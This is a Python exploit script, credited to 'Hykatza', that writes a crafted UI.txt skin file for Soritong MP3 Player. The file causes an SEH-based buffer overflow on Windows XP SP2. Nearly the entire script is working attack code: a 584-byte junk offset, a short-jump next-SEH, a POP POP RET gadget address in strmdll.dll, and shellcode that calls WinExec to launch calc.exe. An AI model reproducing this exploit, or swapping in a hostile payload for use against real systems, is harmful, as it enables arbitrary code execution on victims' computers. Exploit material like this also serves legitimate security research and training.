# -*- coding: utf-8 -*-
"""
#[+] Author: Hykatza
#[+] Title: Exploiting Soritong MP3 Player (Exploit based in SEH)
#[+] Type: Exploit
#[+] Download Vulnerable App: https://www.exploit-db.com/apps/a1def037869c831496bda3d81b0d06f5-soritong10.exe
#[+] Shellcode: calc.exe
#[+] Tested on: WinXp 32bit SP2
#[+] Friendly sites: untalhykatza.blogspot.mx
#[+] Twitter: @hykatza
=====================================================

         .
         \'~~~-,
          \    '-,_
           \ /\    `~'~''\          M Ãˆ X I C O
           _\ \\          \/~\
           \__ \\             \
              \ \\.             \
               \ \ \             `~~
                '\\ \.             /
                 L \  \            |
                  \_\  \           |             _.----,
                        |  hykatza  \           !     /
                       '._  00101    \_      __/    _/
                          \_           ''--''    __/
                            \.__                |
                                ''.__  __.._   __\
                                     ''     './  `
=====================================================
"""
fileName='UI.txt';
fileC=open(fileName,'w');
junk='\x41'*584
nseh='\xEB\x06\x90\x90'#Short jump 6 bytes NOP+NOP+SEH
seh='\xf1\xb1\x01\x10' #POP POP RET -> 0x1001b1f1 -> strmdll.dll
shellcode=(
    "\x90"                      #nops
    "\x33\xd2"                  #xor edx,edx
    "\x52"                      #push edx
    "\x68\x2e\x65\x78\x65"	#push ".exe"
    "\x68\x63\x61\x6c\x63"	#push "calc"
    "\x89\xe0"			#mov eax,esp
    "\x6a\x01"			#push 1
    "\x50"			#push eax
    "\xbb\x4d\x11\x86\x7c"	#mov ebx,kernel32.WinExec -> mov ebx,0x7c86114d
    "\xff\xd3"		        #call ebx
    "\x6a\x01"                  #push 1
    "\xbb\xa2\xca\x81\x7c"      #mov ebx,kernel32.ExitProcess-> mov ebx,0x7c81caa2
    "\xff\xd3"                  #call ebx
);
shellcode+="\x90"*1000;
contentExploit=junk+nseh+seh+shellcode;
fileC.write(contentExploit);
fileC.close();
